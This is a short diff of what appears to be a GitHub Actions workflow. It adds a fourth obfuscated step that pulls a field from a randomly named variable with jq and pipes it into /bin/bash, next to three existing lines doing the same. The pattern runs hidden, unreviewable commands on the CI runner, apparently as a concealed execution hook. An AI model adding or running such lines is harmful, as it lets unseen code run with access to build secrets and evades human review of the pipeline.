@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$ibgmd09292" | jq -r .lb98 | /bin/bash
           echo $honp56 | jq -r .ney13 | /bin/bash
           echo $cme8 | jq -r .qnc54911 | /bin/bash
+          printf '%s' "$fsx91" | jq -r .jbnxs1 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
